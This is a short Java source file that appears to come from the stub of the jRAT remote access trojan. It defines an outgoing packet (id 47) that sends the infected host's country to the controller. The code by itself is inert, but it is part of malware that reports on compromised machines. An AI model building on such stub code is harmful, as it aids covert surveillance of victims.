package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet47InitCountry extends AbstractOutgoingPacket {

	private String country;

	public Packet47InitCountry(String country) {
		this.country = country;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(country);
	}

	@Override
	public byte getPacketId() {
		return (byte) 47;
	}
}